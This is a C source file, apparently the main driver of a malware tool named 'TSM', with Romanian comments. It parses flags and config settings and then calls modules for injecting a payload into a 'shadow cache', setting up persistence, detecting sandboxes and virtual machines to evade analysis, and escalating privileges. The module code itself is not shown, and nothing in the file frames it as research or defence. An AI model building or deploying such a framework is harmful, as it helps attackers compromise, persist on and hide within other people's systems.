#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "utils.h"           // Include funcțiile utilitare
#include "shadow_inject.h"    // Include pentru funcțiile de injectare în shadow cache
#include "temp_files.h"       // Include pentru manipularea fișierelor temporare
#include "evasion.h"          // Include pentru evaziune
#include "persistence.h"      // Include pentru persistență
#include "privilege_escalation.h" // Include pentru escaladarea privilegiilor

// Funcție de afișare a utilizării programului
void print_usage() {
    printf("Usage: TSM [options]\n");
    printf("Options:\n");
    printf("  --inject-shadow       Enable shadow injection\n");
    printf("  --persistence         Enable persistence\n");
    printf("  --evasion             Enable evasion techniques\n");
    printf("  --priv-escalate       Attempt privilege escalation\n");
    printf("  --help                Show this help message\n");
}

int main(int argc, char *argv[]) {
    int inject_shadow = 0;
    int persistence = 0;
    int evasion = 0;
    int privilege_escalate = 0;

    // Parsează argumentele de linia de comandă
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--inject-shadow") == 0) {
            inject_shadow = 1;
        } else if (strcmp(argv[i], "--persistence") == 0) {
            persistence = 1;
        } else if (strcmp(argv[i], "--evasion") == 0) {
            evasion = 1;
        } else if (strcmp(argv[i], "--priv-escalate") == 0) {
            privilege_escalate = 1;
        } else if (strcmp(argv[i], "--help") == 0) {
            print_usage();
            return 0;
        } else {
            printf("Unknown option: %s\n", argv[i]);
            print_usage();
            return 1;
        }
    }

    // Încarcă setările din config.json (exemplu de utilizare a funcției din utils.c)
    if (read_config("inject_shadow")) inject_shadow = 1;
    if (read_config("persistence")) persistence = 1;
    if (read_config("evasion")) evasion = 1;
    if (read_config("privilege_escalate")) privilege_escalate = 1;

    // Execută modulele în funcție de flagurile setate
    if (inject_shadow) {
        log_event("Executing shadow injection...");
        initialize_shadow_injection();
        inject_to_shadow("payload");
    }
    
    if (persistence) {
        log_event("Setting up persistence...");
        enable_persistence();
    }
    
    if (evasion) {
        log_event("Executing evasion techniques...");
        if (detect_sandbox()) log_event("Sandbox detected");
        if (detect_vm()) log_event("Virtual Machine detected");
    }
    
    if (privilege_escalate) {
        log_event("Attempting privilege escalation...");
        if (!escalate_privileges()) {
            log_event("Privilege escalation failed");
        }
    }

    log_event("TSM execution completed.");
    return 0;
}

